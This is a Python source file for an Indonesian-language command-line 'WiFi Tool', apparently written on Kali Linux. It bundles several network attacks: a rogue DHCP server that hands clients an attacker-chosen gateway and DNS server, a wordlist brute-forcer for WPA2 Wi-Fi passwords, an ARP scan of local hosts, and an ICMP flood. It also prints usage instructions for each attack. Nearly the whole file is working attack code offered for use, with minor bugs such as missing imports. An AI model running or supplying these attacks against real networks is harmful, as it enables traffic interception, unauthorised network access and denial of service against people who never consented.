#!/home/kali/Documents/projo/src/bin/python

import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile
from scapy.all import *
from mac_vendor_lookup import MacLookup, VendorNotFoundError
import time, argparse, os, pyfiglet, socket, struct, random
from termcolor import colored

class RogueDHCP:
    def __init__(self, target_ip, gateway, dns_s, sub, lt, iface, splitted):
        self.ATTACKER_IP = target_ip
        self.GATEWAY_IP = gateway
        self.DNS_IP = dns_s
        self.SUBNET_MASK = sub
        self.LEASE_TIME = lt
        self.iface = iface
        self.OFFER_POOL = [splitted + str(i) for i in range(200, 250)]
        self.assigned_ips = {}

    def mac2str(self, mac):
        return bytes.fromhex(mac.replace(':', ''))

    def handle_dhcp(self, pkt):
        if DHCP not in pkt:
            return
        
        attacker_mac = get_if_hwaddr(self.iface)
        msg_type = pkt[DHCP].options[0][1]
        mac = pkt[Ether].src

        if msg_type == 1:  # DHCP Discover
            offered_ip = random.choice(self.OFFER_POOL)
            self.assigned_ips[mac] = offered_ip

            print(f"[+] Discover dari {mac} → Offer {offered_ip}")

            ether = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")
            ip = IP(src=self.ATTACKER_IP, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)
            bootp = BOOTP(op=2, yiaddr=offered_ip, siaddr=self.ATTACKER_IP, chaddr=self.mac2str(mac))
            dhcp = DHCP(options=[
                ('message-type', 'offer'),
                ('server_id', self.ATTACKER_IP),
                ('lease_time', int(self.LEASE_TIME)),
                ('subnet_mask', self.SUBNET_MASK),
                ('router', self.GATEWAY_IP),
                ('name_server', self.DNS_IP),
                'end'
            ])
            sendp(ether / ip / udp / bootp / dhcp, iface=self.iface, verbose=0)

        elif msg_type == 3:  # DHCP Request
            if mac in self.assigned_ips:
                requested_ip = self.assigned_ips[mac]
                print(f"[+] Request dari {mac} → ACK {requested_ip}")
                
                attacker_mac = get_if_hwaddr(self.iface)
                ether = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")
                ip = IP(src=self.ATTACKER_IP, dst="255.255.255.255")
                udp = UDP(sport=67, dport=68)
                bootp = BOOTP(op=2, yiaddr=requested_ip, siaddr=self.ATTACKER_IP, chaddr=self.mac2str(mac))
                dhcp = DHCP(options=[
                    ('message-type', 'ack'),
                    ('server_id', self.ATTACKER_IP),
                    ('lease_time', int(self.LEASE_TIME)),
                    ('subnet_mask', self.SUBNET_MASK),
                    ('router', self.GATEWAY_IP),
                    ('name_server', self.DNS_IP),
                    'end'
                ])
                sendp(ether / ip / udp / bootp / dhcp, iface=self.iface, verbose=0)

    def run(self):
        print("[*] Rogue DHCP Server berjalan...")
        sniff(filter="udp and (port 67 or 68)", prn=self.handle_dhcp, store=0, iface=self.iface)

def cracking(ssid, wordlist):
        print("Cracking Wifi Password ", ssid ,", Please Wait...")
        word = open(wordlist, "r")
  
        for passw in word:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            passw=passw.strip()
            print("Trying:",passw)
            profile.key = passw
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.remove_all_network_profiles()
            profile = iface.add_network_profile(profile)

            iface.connect(profile)
            time.sleep(4)
            if iface.status() == const.IFACE_CONNECTED:
                print(passw)
                print('PASSWORD FOUND! SSID:' ,ssid,'PASSWORD:',passw)
                break
        else:
            print("Password Not In List")
            
def scan_wifi():
    print("Scanning for wifi devices")
    print("Please Wait")
    
    wifi = PyWiFi()  # Membuat objek PyWiFi
    iface = wifi.interfaces()[0]  # Mengambil interface pertama (biasanya WiFi)
    
    iface.scan()  # Mulai scan
    time.sleep(5)  # Tunggu hasil scan
    
    results = iface.scan_results()  # Ambil hasil scan

    available_devices = []

    for network in results:
        ssid = network.ssid
        if ssid not in available_devices:
            available_devices.append(ssid)

    print("Available devices:")

    for ssid in available_devices:
        print(ssid)

def get_vendor(mac_address):
    try:
        return mac_look.lookup(mac_address)
    except VendorNotFoundError:
        return "Unknown"

def scan_ip(gateway):
  conf.iface = "wlp2s0"
  mac_look = MacLookup()

  new_ip = re.sub(r'^(\d+\.\d+\.\d+)\.\d+(/24)$', r'\1.0\2', gateway)

  print('[*]Menscan IP Address...')
  eth = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=new_ip)
  result = srp(eth, timeout=2, verbose=0)[0]
  res = []

  print('[+]Menyiapkan IP Address')

  try:
    mac_look.update_vendors()
  except Exception as e:
    print(f"Warning: Gagal update vendor database: {e}")
    
  for sent, received in result:
    try:
        vendor = mac_look.lookup(received.hwsrc)
    except VendorNotFoundError:
        vendor = "Unknown"

    res.append({'ip': received.psrc, 'mac': received.hwsrc, 'vendor': vendor})

  if len(res) == 0:
    print('[!]IP Address tidak ditemukan. coba periksa IP Gateway')
    sys.exit()
  else:
    pass

  print('IP Address    MAC Address    Vendor')
  
  for o in res:
    print(o)

def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += (data[i] << 8) + data[i+1]
    if n:
        s += data[-1] << 8
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def create_icmp_packet(id, seq, size):
    type = 8  # Echo request
    code = 0
    checksum_val = 0
    header = struct.pack("!BBHHH", type, code, checksum_val, id, seq)
    payload = os.urandom(size)
    checksum_val = checksum(header + payload)
    header = struct.pack("!BBHHH", type, code, checksum_val, id, seq)
    return header + payload

def icmp_attack(ip, loop):
    bytes = os.urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.setsockopt(socket.SOL_IP, socket.IP_TTL, 64)
    pkt_id = os.getpid() & 0xFFFF
    size = 56

    for x in range(int(loop)):
        pkt = create_icmp_packet(pkt_id, x, size)
        sock.sendto(bytes, (ip, 0))
        print('paket terkirim:' ,x)
        time.sleep(0.0010)
        
def split_ip(ip):
    return ip.rsplit('.', 1)[0] + "."

def main():
 os.system('clear')
 ascii_art = pyfiglet.figlet_format("WiFi Tool")
 colored_art = colored(ascii_art, "cyan", attrs=["bold"])
 print(colored_art)

 print("Cara Pakai: python3 run.py --c[pilihan]")
 print()
 print("Untuk Bruteforce Wifi password:")
 print("Untuk scan Wi-Fi: python3 run.py --c scan_wifi_lists ")
 print("sudo bin/python run.py --c scan_wifi_lists")
 print("Untuk melakukan serangan brute force Wi-Fi : python3 run.py --c crack_wifi_password --s TARGET_WIFI --w WORDLIST.txt")
 print()
 print("Untuk ICMP Flood:")
 print("Untuk scan LAN IP: python3 run.py --c scan_ip --g GATEWAY_IP")
 print("Untuk melakukan serangan ICMP : python3 run.py --c icmp_attack --ip TARGET_IP --loop JUMLAH_PAKET_DIKIRIM")
 print()
 print("Untuk DHCP Rogue:")
 print("Untuk melakukan serangan: python3 run.py --c dhcp_rogue --ip ATTACKER_IP --g GATEWAY --d DNS_IP --sub SUBNET_MASK --lt LEASE_TIME")

 parser = argparse.ArgumentParser()
 parser.add_argument('--loop', help='Gateway target untuk scan ip. cara penggunaan: --gateway 192.168.1.1/24')
 parser.add_argument('--ip', help='Gateway target untuk scan ip dan DHCP rogue untuk ip attacker. cara penggunaan: --ip 192.168.1.1/24')
 parser.add_argument('--g', help='Gateway target untuk scan ip dan DHCP rogue untuk gateway. cara penggunaan: --g 192.168.1.1/24')
 parser.add_argument('--d', help='DNS untuk DHCP rogue. cara penggunaan: --d 8.8.8.8')
 parser.add_argument('--sub', help='Subnet untuk DHCP rogue. cara penggunaan: --sub 255.255.255.255')
 parser.add_argument('--lt', help='Lease time untuk DHCP rogue. cara penggunaan: --lt 43200')
 parser.add_argument('--s', help='SSID target (hanya untuk mode brute)')
 parser.add_argument('--w', help='Path ke file wordlist (hanya untuk mode brute)')
 parser.add_argument("--c", choices=['scan_wifi_lists', 'crack_wifi_password', 'scan_ip', 'icmp_attack', 'dhcp_rogue'], help="Aksi yang ingin dilakukan")
 args = parser.parse_args()

 if args.c == 'scan_wifi_lists':
  scan_wifi()
 elif args.c == 'crack_wifi_password':
  cracking(args.s, args.w)
 elif args.c == 'scan_ip':
  scan_ip(args.g)
 elif args.c == 'icmp_attack':
  icmp_attack(args.ip, args.loop)
 elif args.c == 'dhcp_rogue':
  splitted = split_ip(args.ip)
  print(splitted)

  target_ip = args.ip
  gateway = args.g
  dns_s = args.d
  sub = args.sub
  lt = args.lt
  iface = "wlp2s0"
  
  dhcp_server = RogueDHCP(target_ip, gateway, dns_s, sub, lt, iface, splitted)
  dhcp_server.run()
  
main()
